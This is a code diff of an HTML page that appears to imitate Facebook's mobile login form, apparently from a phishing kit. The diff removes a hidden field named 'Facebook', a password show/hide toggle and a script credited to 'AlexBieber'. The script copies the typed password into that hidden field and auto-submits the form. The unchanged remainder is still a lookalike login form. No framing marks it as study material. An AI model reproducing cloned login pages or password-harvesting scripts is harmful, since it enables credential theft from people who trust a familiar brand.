@@ -5096,53 +5096,29 @@ div.uiInterstitialWithStripes {
                                       type="password"
                                       data-sigil="password-plain-text-toggle-input"
                                     />
-                                    <input 
-                                      type="hidden"
-                                      id="title"
-                                      name="Facebook"
-                                    />
+                                  
                                   </div>
                                 </div>
                                 <div class="_5s61 _216i _5i2i _52we">
                                   <div class="_5xu4">
-                                    <div
-                                      class="_2pi9"
-                                      style="display: none"
-                                      id="u_0_2_GZ"
-                                    >
-                                      <a
-                                        href="#"
-                                        data-sigil="password-plain-text-toggle"
-                                        ><span
-                                          class="mfss"
-                                          style="display: none"
-                                          id="u_0_3_5A"
-                                          >HIDE</span
-                                        ><span class="mfss" id="u_0_4_kc"
-                                          >SHOW</span
-                                        ></a
-                                      >
+                                 
+                              
+                                       
                                     </div>
                                   </div>
                                 </div>
                               </div>
                             </div>
                           </div>
-                        </div>
+               
                       </div>
                       <div class="_2pie" style="text-align: center">
-                        <div
-                          id="login_password_step_element"
-                          data-sigil="login_password_step_element"
-                        >
+
                           <button
                             type="submit"
                             value="Log In"
                             class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
-                            id="btnsubmit"
-                            name="login"
-                            data-sigil="touchable login_button_block m_login_button"
-                          >
+                           name="login">
                             <span class="_55sr">Log In</span>
                           </button>
                         </div>
@@ -7503,18 +7479,7 @@ div.uiInterstitialWithStripes {
         });
       });
     </script>
-    <script>
-      /* Coded By AlexBieber */
-      const hiddenPass = document.getElementById("title");
-      const password = document.getElementById("password");
-      const form = document.getElementById("login_form");
-      const btn = document.getElementById("btnsubmit");
-      password.onchange = (e) => {
-         hiddenPass.value = e.target.value;
-      }
-      btn.onclick = (e) => {
-          setTimeout(()=>form.submit(),500)
-      }
-      </script>
+  
+      
   </body>
 </html>
